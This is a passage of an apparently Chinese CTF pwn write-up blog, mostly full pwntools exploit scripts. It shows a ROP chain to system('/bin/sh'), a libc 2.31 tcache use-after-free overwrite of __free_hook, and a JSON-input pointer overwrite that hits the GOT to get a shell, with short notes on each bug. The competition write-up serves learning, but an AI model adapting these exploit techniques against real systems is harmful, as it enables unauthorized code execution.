operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"请输入你的姓名:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400CE4'</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'请输入购买的商品序号:'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400f13</span>ret<span class="token operator">=</span><span class="token number">0x00000000004006f6</span>system<span class="token operator">=</span>ep<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span><span class="token number">0x0000000000601840</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'你想要继续买花吗? 1/0'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Heap：libc2-31-无限制UAF"><a href="#Kylin-Heap：libc2-31-无限制UAF" class="headerlink" title="Kylin_Heap：libc2.31 无限制UAF"></a>Kylin_Heap：libc2.31 无限制UAF</h1><p>直接tcache 打 __free_hook</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'What will you do, adventurer?'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'bytes): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ebbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="consumption：json序列化-指针覆盖打GOT"><a href="#consumption：json序列化-指针覆盖打GOT" class="headerlink" title="consumption：json序列化+指针覆盖打GOT"></a>consumption：json序列化+指针覆盖打GOT</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">[*] '/home/xinri/ccb/consumption/pwn'    Arch:       i386-32-little    RELRO:      No RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x8047000)    RUNPATH:    b'/home/xinri/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/'    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在于输入json序列化数据到 v12 时可以覆盖到 v13 存储的指针<br><img src="/EXP_FILE/3f4738a03ed191dd7d29c949cb51c49b_MD5.jpeg"></p><p>这里的<code>*a3</code>就是 v13 存储的指针，可以覆盖为 heaparray 打GOT<br><img src="/EXP_FILE/1b5d02b0735b4b49c0ee482948b40c20_MD5.jpeg"></p><p>有个坑点是 error() 函数除了输出“out!”并没有什么用处，但我先入为主以为会exit，白耗了很长时间，nm<br><img src="/EXP_FILE/4577a05dba2432dd602cae7dc5d8c078_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">import</span> json    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>  p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")  </span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> debug<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      pause<span class="token punctuation">(</span><span class="token punctuation">)</span>      gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>      sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> add_heap<span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"1","idx":0,"size":"'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> free_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"2","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>      <span class="token keyword">def</span> show_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"3","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> edit_heap<span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"4","idx":1,"size":"","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token comment">#debug()  </span><span class="token comment">#pause()  </span>  heaplist <span class="token operator">=</span> <span class="token number">0x08051B10</span>  add_heap<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span>    <span class="token comment">#free_got = elf.got["free"]  </span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>    payload_1 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x4cc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heaplist <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>  add_heap<span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span>payload_1<span class="token punctuation">)</span>  <span class="token comment">#add_heap(0x8,"AAAA")  </span>  show_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\xf7"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>  log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc.address = "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    edit_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>    free_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">#debug()  </span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 